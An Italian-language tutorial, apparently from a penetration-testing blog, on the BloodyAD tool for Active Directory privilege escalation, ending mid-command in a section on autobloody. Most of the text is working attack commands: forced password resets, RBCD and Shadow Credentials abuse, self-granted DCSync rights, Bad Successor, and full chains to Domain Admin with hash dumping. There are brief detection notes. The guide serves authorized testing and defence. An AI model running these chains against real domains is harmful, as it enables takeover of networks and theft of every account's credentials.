---
title: 'BloodyAD: Privilege Escalation in Active Directory (Guida 2026)'
slug: bloodyad
description: 'BloodyAD:autenticazione PTH/PTT, abuso ACE (GenericAll, WriteDACL, RBCD), Shadow Credentials, Bad Successor 2025 e autobloody.Pentest,payload,detection e bypass'
image: /bloodyad-active-directory.webp
draft: false
date: 2026-07-04T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - ACE-abuse
  - autobloody
  - bad-successor
  - bloodyad
---

# BloodyAD: Guida Definitiva al Framework di Privilege Escalation in Active Directory

BloodyAD è il "coltellino svizzero" per la privilege escalation in [Active Directory](https://hackita.it/articoli/active-directory/) tramite LDAP. Dove [BloodHound](https://hackita.it/articoli/bloodhound/) ti mostra i path di escalation, BloodyAD te li esegue — dalla modifica di password a RBCD, Shadow Credentials, DCSync e il recente Bad Successor su Windows Server 2025. Tutto via LDAP, senza PowerShell, senza .NET, da Linux o Windows, anche attraverso un proxy SOCKS.

Creato da CravateRouge e basato sulla libreria MSLDAP di @skelsec, è il complemento naturale di BloodHound in qualsiasi assessment AD.

***

## Cos'è e perché usarlo

BloodyAD esegue **operazioni LDAP/SAMR specifiche** contro un Domain Controller per sfruttare misconfigurazioni di Active Directory. Non scrive file su disco, non spawna processi sul target, non richiede credenziali di Domain Admin per funzionare — ti basta avere i permessi LDAP necessari per l'operazione che vuoi eseguire.

Il workflow classico è:

1. **BloodHound** mappa la rete AD e identifica i path di escalation (es. "l'utente `helpdesk` ha GenericWrite su `DC01$`")
2. **BloodyAD** esegue l'exploit del path trovato (es. configura RBCD su DC01$ per impersonare Administrator)

```
[BloodHound] ──trova path──► GenericWrite su DC01$
                                      │
[BloodyAD] ──esegue──────────────────► add rbcd → getST → DCSync
```

**Vantaggi rispetto alle alternative:**

* Python puro → funziona da Linux senza PowerShell
* LDAP diretto → meno rumore di strumenti che spawna processi
* Supporta tutti i metodi di autenticazione AD (password, hash, ticket, cert)
* SOCKS proxy nativo → usabile tramite C2 come [Sliver](https://hackita.it/articoli/sliver-c2/) o [Havoc](https://hackita.it/articoli/havoc/)
* autobloody companion → esegue interi path BloodHound automaticamente

***

## Architettura — come funziona internamente

BloodyAD comunica con il Domain Controller principalmente tramite **LDAP** (porta 389) o **LDAPS** (porta 636). Per alcune operazioni (es. cambio password) usa anche **SAMR** (SAM Remote Protocol, porta 445/SMB).

```
[BloodyAD]
    │
    ├── LDAP/LDAPS → Domain Controller
    │   ├── Lettura attributi oggetti AD (get)
    │   ├── Scrittura attributi (set)
    │   ├── Aggiunta oggetti/relazioni (add)
    │   └── Rimozione (remove)
    │
    └── SAMR (via SMB) → Domain Controller
        └── Cambio password SAMR (alternativo a LDAP)
```

**Stack tecnico:**

* `msldap` (di @skelsec) — libreria LDAP asincrona che supporta tutti i metodi di auth AD
* `impacket` — strutture LDAP, SAMR, e Kerberos
* `DSinternals` — operazioni crittografiche specifiche AD (shadow credentials, PAC)
* Python 3.7+

Questo stack permette a BloodyAD di fare operazioni che altri tool (PowerView, ldap3 diretto) non gestiscono facilmente: Kerberos PKINIT con certificati, pass-the-ticket trasparente, proxy SOCKS per tutte le operazioni.

***

## Installazione

```bash
# Metodo 1 — pip (consigliato)
pip install bloodyAD

# Metodo 2 — da sorgente (per sviluppo o versione più recente)
git clone https://github.com/CravateRouge/bloodyAD.git
cd bloodyAD
pip install .

# Metodo 3 — in ambiente virtuale (best practice per evitare conflitti)
python3 -m venv venv
source venv/bin/activate
pip install bloodyAD

# Verifica installazione
bloodyAD --help
```

**Dipendenze risolte automaticamente:** DSinternals, Impacket, msldap, cryptography.

***

## Sintassi base e opzioni globali

La struttura di ogni comando BloodyAD è:

```bash
bloodyAD [OPZIONI GLOBALI] AZIONE [OPZIONI AZIONE]
```

**Opzioni globali:**

```bash
-H / --host        IP o FQDN del Domain Controller (obbligatorio)
-d / --domain      Nome del dominio (es. corp.local)
-u / --username    Username
-p / --password    Password in chiaro, hash NTLM, o ticket Kerberos
-k / --kerberos    Usa Kerberos (legge KRB5CCNAME dall'ambiente)
-c / --certificate Path al file PFX per autenticazione via certificato
--dc-ip            IP del DC (se diverso da --host)
--gc               Usa il Global Catalog (porta 3268) invece di LDAP
-s / --secure      Usa LDAPS invece di LDAP
--proxy            URL proxy SOCKS5 (es. socks5://127.0.0.1:1080)
```

**Azioni disponibili:** `get`, `set`, `add`, `remove`

***

## Autenticazione — tutti i metodi

Questa è una delle parti più potenti di BloodyAD: supporta nativamente tutti i metodi di autenticazione AD senza richiedere configurazioni aggiuntive.

### Password in chiaro

Il metodo base — username e password in chiaro via LDAP.

```bash
bloodyAD --host 10.10.10.5 -d corp.local -u admin -p 'Password123!' get object Administrator
```

### Pass-the-Hash (PTH)

Invece della password usi l'hash NTLM dell'utente. Il formato è `:HASH` (con i due punti prima dell'hash).

```bash
# Hash NTLM recuperato via Mimikatz, secretsdump, o ntlmrelayx
bloodyAD --host 10.10.10.5 -d corp.local -u admin \
  -p ':a0b1c2d3e4f5a0b1c2d3e4f5a0b1c2d3' \
  get object Administrator
```

> Il formato `:HASH` è la stessa convenzione usata da [Impacket](https://hackita.it/articoli/impacket/) — se sai fare `psexec.py -hashes :HASH ...`, BloodyAD funziona allo stesso modo.

### Pass-the-Ticket (PTT / Kerberos)

Usa un ticket Kerberos già ottenuto (.ccache). Ideale dopo aver fatto overpass-the-hash o dopo aver ottenuto un TGT.

```bash
# Esporta il ticket come variabile d'ambiente
export KRB5CCNAME=/tmp/admin.ccache

# Usa -k per attivare Kerberos
bloodyAD --host dc01.corp.local -d corp.local -u admin -k \
  get object 'DC=corp,DC=local' --attr ms-DS-MachineAccountQuota
```

### Autenticazione con certificato (PKINIT)

Usa un certificato X.509 per autenticarsi via Kerberos PKINIT. Utile dopo aver sfruttato Shadow Credentials o ADCS.

```bash
# File .pfx = certificato + chiave privata
bloodyAD --host dc01.corp.local -d corp.local -u admin \
  -c /tmp/admin.pfx \
  get object Administrator
```

### Via proxy SOCKS

Quando lavori tramite un C2 con SOCKS5 attivo (Sliver, Havoc, SSH -D):

```bash
# SOCKS5 da Sliver o Havoc
bloodyAD --host 10.10.10.5 -d corp.local -u admin -p 'Pass123' \
  --proxy socks5://127.0.0.1:1080 \
  get object Administrator
```

***

## `get` — enumerazione AD

Il gruppo di comandi `get` legge informazioni dal Domain Controller senza modificare nulla. È la fase di ricognizione prima di un'operazione.

### `get object` — attributi di un oggetto

```bash
# Ottieni tutti gli attributi di un utente
bloodyAD --host DC -d corp -u user -p pass get object Administrator

# Solo attributi specifici
bloodyAD --host DC -d corp -u user -p pass get object Administrator \
  --attr sAMAccountName,memberOf,userAccountControl

# Ottieni info su un computer
bloodyAD --host DC -d corp -u user -p pass get object 'DC01$'

# Ottieni info sul dominio stesso
bloodyAD --host DC -d corp -u user -p pass \
  get object 'DC=corp,DC=local' --attr minPwdLength,lockoutThreshold

# Attributi utili da cercare
# userAccountControl → flags account (password mai scade, disabilitato, ecc.)
# memberOf → gruppi a cui appartiene
# pwdLastSet → data ultimo cambio password
# lastLogon → ultimo accesso
# adminCount → 1 se protetto da AdminSDHolder
# servicePrincipalName → SPN configurati (Kerberoasting)
# msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD configurato
```

### `get writable` — oggetti con cui possiamo interagire

Questo è uno dei comandi più utili — lista tutti gli oggetti AD su cui l'utente corrente ha permessi di scrittura.

```bash
# Lista tutti gli oggetti che l'utente corrente può modificare
bloodyAD --host DC -d corp -u user -p pass get writable

# Output tipico:
# distinguishedName: CN=john.doe,CN=Users,DC=corp,DC=local
#   permission: WriteProperty (pwdLastSet, description)
# distinguishedName: CN=Helpdesk,CN=Groups,DC=corp,DC=local
#   permission: WriteMember

# Filtra per tipo di oggetto (OU, USER, COMPUTER, GROUP, DOMAIN, GPO)
bloodyAD --host DC -d corp -u user -p pass get writable --otype COMPUTER

# Filtra per tipo di diritto (ALL, WRITE, CHILD)
bloodyAD --host DC -d corp -u user -p pass get writable --right WRITE

# Mostra il dettaglio degli attributi/object type scrivibili per ogni oggetto
bloodyAD --host DC -d corp -u user -p pass get writable --detail

# Escludi gli oggetti cancellati (di default sono inclusi)
bloodyAD --host DC -d corp -u user -p pass get writable --exclude-del

# Esporta i risultati in uno zip compatibile con BloodHound
bloodyAD --host DC -d corp -u user -p pass get writable --bh
```

L'output di `get writable` corrisponde esattamente ai path che BloodHound mostrerebbe come "edge" a partire dall'utente corrente.

### `get bloodhound` — collector BloodHound CE integrato

BloodyAD include un collector BloodHound CE nativo — comodo quando non puoi far girare SharpHound (es. AV/EDR aggressivo) e ti basta LDAP puro. È ancora in sviluppo: copre le basi ma non ADCS ESC e altri nodi complessi.

```bash
bloodyAD --host DC -d corp -u user -p pass get bloodhound

# Prova a raggiungere anche i trust per un dataset più completo
# (lancialo da un DC del dominio dell'utente per risultati più esaustivi)
bloodyAD --host DC -d corp -u user -p pass get bloodhound --transitive

# Salva lo zip in un path specifico
bloodyAD --host DC -d corp -u user -p pass get bloodhound --path /tmp/bh_data.zip
```

### `get trusts` — mappa dei trust di dominio/foresta

```bash
bloodyAD --host DC -d corp -u user -p pass get trusts

# A->B: A può autenticarsi su B
# A-<B: B può autenticarsi su A
# A-<>B: trust bidirezionale

bloodyAD --host DC -d corp -u user -p pass get trusts --transitive
```

### `get dnsDump` — dump di tutti i record DNS leggibili

Più comodo di interrogare oggetto per oggetto — enumera in un colpo solo tutti i record DNS della zona che l'utente può leggere.

```bash
bloodyAD --host DC -d corp -u user -p pass get dnsDump

# Solo una zona specifica
bloodyAD --host DC -d corp -u user -p pass get dnsDump --zone corp.local

# Nascondi i record di sistema (_ldap, _kerberos, @, ecc.)
bloodyAD --host DC -d corp -u user -p pass get dnsDump --no-detail
```

### `get children` — contenuto di un OU o container

```bash
# Lista tutti gli oggetti dentro una OU
bloodyAD --host DC -d corp -u user -p pass \
  get children 'OU=Users,DC=corp,DC=local'

# Lista computer in una OU specifica
bloodyAD --host DC -d corp -u user -p pass \
  get children 'OU=Workstations,DC=corp,DC=local' --type computer
```

### `get membership` — appartenenza a gruppi

```bash
# Gruppi di cui fa parte un utente
bloodyAD --host DC -d corp -u user -p pass \
  get membership john.doe

# Membri di un gruppo specifico
bloodyAD --host DC -d corp -u user -p pass \
  get membership 'Domain Admins'

# Ricorsivo — segue i gruppi annidati
bloodyAD --host DC -d corp -u user -p pass \
  get membership john.doe --full-tree
```

### `get search` — ricerca LDAP custom

Per ricerche LDAP avanzate con filtri custom:

```bash
# Tutti gli utenti con SPN configurato (Kerberoasting candidates)
bloodyAD --host DC -d corp -u user -p pass \
  get search '(&(objectClass=user)(servicePrincipalName=*))' \
  --attr sAMAccountName,servicePrincipalName

# Computer con delegazione non vincolata
bloodyAD --host DC -d corp -u user -p pass \
  get search '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' \
  --attr dNSHostName,userAccountControl

# Utenti con adminCount=1 (protected by AdminSDHolder)
bloodyAD --host DC -d corp -u user -p pass \
  get search '(&(objectClass=user)(adminCount=1))' \
  --attr sAMAccountName,memberOf
```

***

## `set` — modifica attributi AD

I comandi `set` modificano attributi di oggetti AD esistenti. Richiedono il permesso appropriato sull'oggetto target.

### `set password` — cambio password

Il cambio password è uno dei path di escalation più diretti. Se hai `ForceChangePassword` o `GenericAll` su un utente, puoi cambiargli la password senza conoscere quella attuale.

```bash
# Cambia password con GenericAll o ForceChangePassword
bloodyAD --host DC -d corp -u user -p pass \
  set password john.doe 'NewPass123!'

# Con pass-the-hash dell'utente che ha il permesso
bloodyAD --host DC -d corp -u helpdesk \
  -p ':a0b1c2d3e4f5a0b1c2d3e4f5a0b1c2d3' \
  set password admin.target 'Pwned123!'
```

> **Quando hai ForceChangePassword o GenericAll su un utente**, questo è il modo più diretto — cambia la password e loggati con le nuove credenziali. Attenzione: il cambio di password potrebbe essere visibile nei log (Event ID 4723/4724).

### `set object` — modifica attributo generico

Per modificare qualsiasi attributo di un oggetto AD su cui hai `WriteProperty`.

```bash
# Aggiungi SPN a un account (per Kerberoasting forzato o altre operazioni)
bloodyAD --host DC -d corp -u user -p pass \
  set object john.doe servicePrincipalName 'http/john.doe.corp.local'

# Modifica descrizione (es. aggiungi info di controllo)
bloodyAD --host DC -d corp -u user -p pass \
  set object john.doe description 'Utente di test'

# Modifica userAccountControl — es. disabilita un account
bloodyAD --host DC -d corp -u admin -p pass \
  set object victim.user userAccountControl 514   # 512=normal, 514=disabled

# Abilita l'account
bloodyAD --host DC -d corp -u admin -p pass \
  set object victim.user userAccountControl 512

# Modifica msDS-KeyCredentialLink (Shadow Credentials manuale)
# → usa 'add shadowCredentials' invece — più facile
```

### `set owner` — cambia proprietario di un oggetto

Se hai `WriteOwner` su un oggetto, puoi impostare te stesso come proprietario e poi modificarne le ACL.

```bash
# Diventa proprietario dell'utente target
bloodyAD --host DC -d corp -u user -p pass \
  set owner john.doe user   # "user" = username dell'utente corrente

# Ora come proprietario puoi modificare le ACL → aggiungiti GenericAll
# poi usa set password o add shadowCredentials
```

***

## `add` — aggiungi oggetti e relazioni

I comandi `add` aggiungono nuovi oggetti AD o relazioni tra oggetti esistenti.

### `add groupMember` — aggiungi utente a gruppo

Se hai `GenericAll`, `GenericWrite`, o `WriteMember` su un gruppo, puoi aggiungere qualsiasi utente.

```bash
# Aggiungiti al gruppo Domain Admins (se hai GenericAll/WriteMember)
bloodyAD --host DC -d corp -u user -p pass \
  add groupMember 'Domain Admins' user

# Aggiungi un computer account a un gruppo
bloodyAD --host DC -d corp -u user -p pass \
  add groupMember 'Enterprise Admins' 'WORKSTATION01$'

# Con Kerberos pass-the-ticket
export KRB5CCNAME=/tmp/exploit.ccache
bloodyAD --host dc01.corp.local -d corp -u user -k \
  add groupMember 'Domain Admins' user
```

### `add rbcd` — Resource-Based Constrained Delegation

RBCD è uno degli attacchi AD più potenti. Se hai `GenericAll` o `GenericWrite` su un oggetto computer, puoi configurare RBCD per impersonare qualsiasi utente su quel computer — incluso Administrator per poi fare DCSync.

**Come funziona RBCD:**

```
[Attaccante ha GenericWrite su DC01$]
        │
        ▼
BloodyAD: add rbcd DC01$ ATTACKER_COMPUTER$
    → Configura msDS-AllowedToActOnBehalfOfOtherIdentity su DC01$
        │
        ▼
impacket-getST: chiedi TGS per ATTACKER_COMPUTER$ che impersona Administrator su DC01
        │
        ▼
export KRB5CCNAME → impacket-secretsdump / impacket-psexec
```

```bash
# Step 1: Crea un computer account controllato dall'attaccante
# (richiede MachineAccountQuota > 0, di default è 10 su qualsiasi utente di dominio)
impacket-addcomputer corp.local/user:pass -dc-ip DC_IP -computer-name 'ATTACK01$' -computer-pass 'AttackPass!'

# Step 2: Configura RBCD su DC01$ per permettere ad ATTACK01$ di delegare
bloodyAD --host DC -d corp -u user -p pass \
  add rbcd 'DC01$' 'ATTACK01$'

# Verifica che RBCD sia stato configurato
bloodyAD --host DC -d corp -u user -p pass \
  get object 'DC01$' --attr msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3: Richiedi TGS che impersona Administrator
impacket-getST -spn 'cifs/dc01.corp.local' \
  -impersonate 'Administrator' \
  -dc-ip DC_IP \
  'corp.local/ATTACK01$:AttackPass!'

# Step 4: Usa il ticket per DCSync
export KRB5CCNAME='Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache'
impacket-secretsdump -k -no-pass dc01.corp.local
```

### `add shadowCredentials` — Shadow Credentials

Le Shadow Credentials abusano del campo `msDS-KeyCredentialLink` degli oggetti AD. Se hai `GenericWrite` o `GenericAll` su un utente/computer, puoi aggiungere una coppia di chiavi crittografiche al suo profilo — e poi autenticarti come quell'utente via PKINIT senza conoscerne la password.

```bash
# Aggiungi Shadow Credentials a un utente target
bloodyAD --host DC -d corp -u attacker -p pass \
  add shadowCredentials john.doe

# Output:
# [+] Key Credential Link added to john.doe
# [*] Saved certificate to: john.doe_shadow.pfx (password: shadow_pass)

# Usa il certificato per autenticarti come john.doe e ottenere il suo NT hash
impacket-gettgt corp.local/john.doe -pfx-base64 $(base64 -w 0 john.doe_shadow.pfx) \
  -pfx-password shadow_pass -dc-ip DC_IP

# Oppure direttamente con certipy
certipy auth -pfx john.doe_shadow.pfx -username john.doe -domain corp.local -dc-ip DC_IP
# → restituisce NT hash di john.doe
```

### `add dnsRecord` — aggiungi record DNS

Se hai i permessi, puoi aggiungere record DNS custom al dominio AD (es. per risponder poisoning interno).

```bash
# Aggiungi un record A
bloodyAD --host DC -d corp -u user -p pass \
  add dnsRecord attacker 10.10.14.1

# Verifica che il record sia stato aggiunto
bloodyAD --host DC -d corp -u user -p pass \
  get object 'attacker.corp.local' --type dnsnode

# Altri tipi di record (default A)
bloodyAD --host DC -d corp -u user -p pass \
  add dnsRecord webserver 10.10.14.1 --dnstype A --zone corp.local --ttl 300
```

### `add genericAll` — concedi controllo completo via ACE

Se hai già `WriteDACL` (o sei owner) su un oggetto, `add genericAll` aggiunge direttamente una ACE che ti dà controllo pieno — alternativa nativa più diretta rispetto a passare da `msldap setsd`.

```bash
# Concedi a MYUSER controllo completo su TARGET (utente, gruppo, OU, computer...)
bloodyAD --host DC -d corp -u user -p pass \
  add genericAll TARGET MYUSER

# Esempio: dopo aver preso ownership con set owner, ti auto-concedi GenericAll
bloodyAD --host DC -d corp -u user -p pass \
  set owner victim.user user
bloodyAD --host DC -d corp -u user -p pass \
  add genericAll victim.user user
# ora hai GenericAll → set password, add shadowCredentials, ecc.
```

### `add dcsync` — concedi diritti di replica (DCSync)

Se hai `WriteDACL` sull'oggetto dominio (o ne sei owner), `add dcsync` aggiunge le due extended right necessarie (`DS-Replication-Get-Changes` e `DS-Replication-Get-Changes-All`) al trustee indicato — senza bisogno di essere Domain Admin.

```bash
bloodyAD --host DC -d corp -u it_user -p pass \
  add dcsync it_user

# poi DCSync vero e proprio con impacket
impacket-secretsdump corp.local/it_user:pass@DC_IP -just-dc
```

### `add uac` — imposta flag userAccountControl

A differenza di `set object userAccountControl <valore>` (che sovrascrive l'intero bitmask e richiede calcolarlo a mano), `add uac` aggiunge solo il flag specifico senza toccare gli altri.

```bash
# Disabilita il requisito di pre-autenticazione Kerberos (AS-REP Roasting)
bloodyAD --host DC -d corp -u user -p pass \
  add uac TARGET -f DONT_REQ_PREAUTH

# Abilita delega non vincolata su un computer (se hai i permessi)
bloodyAD --host DC -d corp -u admin -p pass \
  add uac 'SERVER01$' -f TRUSTED_FOR_DELEGATION

# Abilita delega vincolata con protocol transition
bloodyAD --host DC -d corp -u user -p pass \
  add uac TARGET_USER -f TRUSTED_TO_AUTH_FOR_DELEGATION

# Password che non scade mai (utile per non "rompere" un account durante un test)
bloodyAD --host DC -d corp -u admin -p pass \
  add uac TARGET -f DONT_EXPIRE_PASSWORD
```

> Flag combinabili con più `-f` nella stessa chiamata. Vedi anche `remove uac` più avanti per il cleanup.

### `add computer` — crea un computer account (nativo)

Alternativa integrata a `impacket-addcomputer`: sfrutta il `MachineAccountQuota` per creare un computer account controllato dall'attaccante, utile per RBCD.

```bash
bloodyAD --host DC -d corp -u user -p pass \
  add computer EVIL01 'Evil@Pass123'

# Con OU specifica
bloodyAD --host DC -d corp -u user -p pass \
  add computer EVIL01 'Evil@Pass123' --ou 'OU=Workstations,DC=corp,DC=local'
```

> Se ottieni l'errore `problem 1005 (CONSTRAINT_ATT_TYPE)`, assicurati di passare il dominio come FQDN completo in `-d` (es. `-d corp.local`, non solo `corp`).

### `add user` — crea un nuovo utente (nativo)

```bash
bloodyAD --host DC -d corp -u user -p pass \
  add user evil.user 'Password123!'

# Con OU specifica
bloodyAD --host DC -d corp -u user -p pass \
  add user evil.user 'Password123!' --ou 'OU=Users,DC=corp,DC=local'
```

### `add badSuccessor` — Windows Server 2025

Bad Successor è una vulnerabilità/abuso di Windows Server 2025 che coinvolge gli oggetti **DMSA (Delegated Managed Service Account)**. Se hai il permesso di creare oggetti in almeno una OU del dominio (molto comune), puoi creare un DMSA che impersona account privilegiati.

```bash
# Verifica se lo schema AD supporta DMSA (richiede schema version 91+ = WS2025)
bloodyAD --host DC -d corp -u user -p pass \
  get object 'CN=Schema,CN=Configuration,DC=corp,DC=local' \
  --attr objectVersion
# Se objectVersion >= 91 → WS2025 schema, attacco possibile

# Esegui il Bad Successor attack
# Crea un DMSA che può impersonare Administrator
bloodyAD --host DC -d corp -u user -p pass \
  add badSuccessor evil-dmsa

# Output:
# [+] DMSA created: evil-dmsa$
# [+] Saved ticket to: evil-dmsa$.ccache

# Usa il ticket per autenticarti come Administrator
export KRB5CCNAME=evil-dmsa$.ccache
impacket-secretsdump -k -no-pass dc01.corp.local

# Con target specifico (-t)
bloodyAD --host DC -d corp -u user -p pass \
  add badSuccessor evil-dmsa \
  -t 'CN=Administrator,CN=Users,DC=corp,DC=local'
```

***

## `remove` — rimuovi oggetti e relazioni

I comandi `remove` eliminano relazioni o attributi. Utili per cleanup post-exploitation o per rimuovere artefatti temporanei.

```bash
# Rimuovi utente da gruppo
bloodyAD --host DC -d corp -u admin -p pass \
  remove groupMember 'Domain Admins' user

# Rimuovi RBCD configurato
bloodyAD --host DC -d corp -u user -p pass \
  remove rbcd 'DC01$' 'ATTACK01$'

# Revoca i diritti DCSync concessi con 'add dcsync'
bloodyAD --host DC -d corp -u it_user -p pass \
  remove dcsync it_user

# Rimuovi un record DNS aggiunto in precedenza (cleanup PoC)
bloodyAD --host DC -d corp -u user -p pass \
  remove dnsRecord webserver 10.10.14.1

# Rimuovi Shadow Credentials aggiunte
bloodyAD --host DC -d corp -u attacker -p pass \
  remove shadowCredentials john.doe --key KEY_ID
# KEY_ID è visibile nell'output di 'add shadowCredentials' o 'get object --attr msDS-KeyCredentialLink'
# senza --key rimuove TUTTE le Key Credentials del target

# Rimuovi la ACE GenericAll aggiunta con 'add genericAll'
bloodyAD --host DC -d corp -u user -p pass \
  remove genericAll TARGET MYUSER

# Rimuovi un flag userAccountControl (es. riabilita pre-auth Kerberos disabilitata prima)
bloodyAD --host DC -d corp -u user -p pass \
  remove uac TARGET -f DONT_REQ_PREAUTH

# Elimina completamente un oggetto AD (utente, gruppo, computer, OU...)
# ATTENZIONE: a differenza degli altri 'remove', questo cancella l'oggetto intero
bloodyAD --host DC -d corp -u admin -p pass \
  remove object 'CN=evil.user,CN=Users,DC=corp,DC=local'
```

> `remove object` sposta l'oggetto nel container "Deleted Objects" (tombstone/recycle bin) — non lo distrugge subito. Per il periodo di tombstone lifetime (default 180 giorni) è ancora recuperabile con `set restore` — vedi la sezione dedicata più avanti.

***

## Oggetti cancellati — enumerazione e restore (AD Recycle Bin / Tombstone)

Quando un oggetto AD viene cancellato (utente, gruppo, computer, GPO...), non sparisce subito. Se l'AD Recycle Bin è attivo, l'oggetto diventa **recycled** e resta recuperabile con tutti gli attributi per la durata del `tombstone lifetime` (default 180 giorni). Se il Recycle Bin non è abilitato o il DC è più vecchio di 2008 R2, l'oggetto viene solo **tombstoned**: perde la maggior parte degli attributi (incluse le membership di gruppo) ma conserva `objectSid`, `nTSecurityDescriptor` (quindi le ACL dirette restano intatte) e, da Windows 2003 in poi, il `sIDHistory`.

Questo è un vettore di attacco spesso trascurato: se un attaccante ha diritti di scrittura su un oggetto cancellato o su una OU dove ripristinarlo, può far tornare in vita account privilegiati, o oggetti ancora referenziati in ACL su risorse critiche.

### Trovare oggetti cancellati su cui hai permessi

```bash
# get writable con oggetti cancellati inclusi
bloodyAD --host DC -d corp -u user -p pass -k get writable --include-del

# Output tipico:
# distinguishedName: CN=garbage.admin\0ADEL:c9e8a129-f77f-4159-b700-3c8fd06963fe,CN=Deleted Objects,DC=corp,DC=local
#   permission: WRITE
# distinguishedName: CN=Users,DC=corp,DC=local
#   permission: CREATE_CHILD   ← serve anche questo per ripristinare l'oggetto nella OU
```

Nota: `get writable` di default include già i deleted objects; usa `--exclude-del` se vuoi escluderli dai risultati.

### Ricerca avanzata con i controlli LDAP per oggetti tombstoned

```bash
# Ricerca con i controlli estesi che mostrano oggetti tombstoned/recycled
bloodyAD --host DC -d corp -u user -p pass -k get search \
  -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 \
  --filter '(isDeleted=TRUE)' --attr sAMAccountName,objectSid,lastKnownParent
```

### `set restore` — ripristina un oggetto cancellato

```bash
# Ripristino base — usa sAMAccountName, DN, o SID (SID è più affidabile se ci sono duplicati)
bloodyAD --host DC -d corp -u user -p pass -k set restore todd.wolfe
# [+] todd.wolfe has been restored successfully under CN=Todd Wolfe,OU=Support,DC=corp,DC=local

# Ripristino tramite SID (consigliato se sAMAccountName potrebbe essere duplicato)
bloodyAD --host DC -d corp -u user -p pass \
  set restore 'S-1-5-21-1394970401-3214794726-2504819329-1104'

# Ripristino con nuovo nome (aggiorna anche sAMAccountName, UPN, SPN)
bloodyAD --host DC -d corp -u user -p pass \
  set restore todd.wolfe --newName 'todd.wolfe2'

# Ripristino in una OU diversa da quella originale
bloodyAD --host DC -d corp -u user -p pass \
  set restore todd.wolfe --newParent 'OU=Users,DC=corp,DC=local'
```

**Requisiti:** serve il permesso `Restore Deleted Objects` (o essere owner/avere WRITE sull'oggetto tombstoned) più `CREATE_CHILD` sulla OU di destinazione.

### Scenari di abuso reali

```bash
# Scenario A — Restore di un utente admin cancellato per errore/da un IT che non sa
# che il gruppo Domain Admins referenzia ancora il suo SID in qualche ACL
bloodyAD --host DC -d corp -u user -p pass get writable --include-del
bloodyAD --host DC -d corp -u user -p pass set restore old.admin
# old.admin torna vivo con le stesse membership/ACL di prima della cancellazione

# Scenario B — SID History abuse: un utente cancellato aveva sidHistory
# verso un gruppo privilegiato. Il ripristino riporta anche quello.
bloodyAD --host DC -d corp -u user -p pass \
  get object old.admin --attr sIDHistory --raw

# Scenario C — Un gruppo cancellato è ancora referenziato nelle ACL di una risorsa
# (share, GPO...). Ripristinandolo e aggiungendosi come membro, si eredita l'accesso.
bloodyAD --host DC -d corp -u user -p pass set restore 'old-privileged-group'
bloodyAD --host DC -d corp -u user -p pass add groupMember old-privileged-group user
```

> HTB TombWatcher è una macchina pensata apposta per esercitarsi su questo vettore (SID History injection + restore di oggetti tombstoned).

### Detection sul restore

```
Event ID 5138 — A directory service object was undeleted
  → l'evento chiave per il monitoring dei restore, con Recycle Bin attivo

4662 su isDeleted=FALSE
  → anche senza Recycle Bin dedicato, ogni operazione di scrittura
    che riporta isDeleted a FALSE genera 4662 sull'oggetto target
```

Per il blue team: abilitare `Directory Service Changes` nell'Advanced Audit Policy (`AuditPol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable`) e allertare su ogni 5138 fuori da operazioni IT pianificate — specialmente se il `lastKnownParent` dell'oggetto ripristinato è una OU con account privilegiati.

***

## Workflow completi — scenari reali

### Scenario 1: GenericAll su utente → Domain Admin

BloodHound mostra: `helpdesk` ha `GenericAll` su `john.admin` (membro di Domain Admins).

```bash
# Step 1: Cambia la password di john.admin
bloodyAD --host 10.10.10.5 -d corp.local -u helpdesk -p 'HelpDesk2024!' \
  set password john.admin 'Pwned@2024!'

# Step 2: Autenticati come john.admin
evil-winrm -i dc01.corp.local -u john.admin -p 'Pwned@2024!'
# oppure
impacket-psexec corp.local/john.admin:'Pwned@2024!'@DC_IP

# Step 3: DCSync con john.admin (ora Domain Admin)
impacket-secretsdump corp.local/john.admin:'Pwned@2024!'@DC_IP -just-dc
```

### Scenario 2: GenericWrite su computer → DCSync via RBCD

BloodHound mostra: `user1` ha `GenericWrite` su `DC01$`.

```bash
# Step 1: Crea computer account controllato
impacket-addcomputer -dc-ip DC_IP corp.local/user1:pass1 \
  -computer-name 'EVIL01$' -computer-pass 'Evil@Pass123'

# Step 2: Configura RBCD
bloodyAD --host DC_IP -d corp.local -u user1 -p pass1 \
  add rbcd 'DC01$' 'EVIL01$'

# Step 3: Ottieni TGS impersonando Administrator
impacket-getST -spn 'cifs/DC01.corp.local' -impersonate Administrator \
  -dc-ip DC_IP 'corp.local/EVIL01$:Evil@Pass123'

# Step 4: DCSync
export KRB5CCNAME='Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache'
impacket-secretsdump -k -no-pass -just-dc DC01.corp.local
```

### Scenario 3: WriteDACL su dominio → DCSync

BloodHound mostra: `it_user` ha `WriteDACL` sull'oggetto dominio `DC=corp,DC=local`.

```bash
# Step 1: Concedi a se stesso i diritti DCSync tramite WriteDACL
bloodyAD --host DC_IP -d corp.local -u it_user -p pass \
  add dcsync it_user

# (internamente aggiunge ExtendedRight DS-Replication-Get-Changes e DS-Replication-Get-Changes-All)

# Step 2: Esegui DCSync
impacket-secretsdump corp.local/it_user:pass@DC_IP -just-dc
# → otterrai tutti gli hash NTLM del dominio, incluso krbtgt
```

### Scenario 4: Shadow Credentials → autenticazione senza password

BloodHound mostra: `support_user` ha `GenericWrite` su `admin_user`.

```bash
# Step 1: Aggiungi Shadow Credentials
bloodyAD --host DC_IP -d corp.local -u support_user -p pass \
  add shadowCredentials admin_user
# → genera admin_user_shadow.pfx

# Step 2: Ottieni TGT di admin_user via certificato
certipy auth -pfx admin_user_shadow.pfx \
  -username admin_user -domain corp.local -dc-ip DC_IP
# → NT hash di admin_user

# Step 3: Usa l'hash
evil-winrm -i DC_IP -u admin_user -H <NT_HASH>
impacket-secretsdump -hashes :<NT_HASH> corp.local/admin_user@DC_IP
```

***

## autobloody — automazione dei path BloodHound

**autobloody** è il companion tool di BloodyAD che automatizza l'intera catena di exploitation di un path BloodHound — dalla sorgente alla destinazione, senza intervento manuale.

```bash
# Installazione
pip install autobloody

# Setup BloodHound CE con dati già importati
# (autobloody interroga Neo4j per i path)

# Esempio: trova ed esegui il path da 'helpdesk' ad 'Administrator'
autobloody -d corp.local -u helpdesk -p 'HelpDesk!' \
  --host DC_IP \
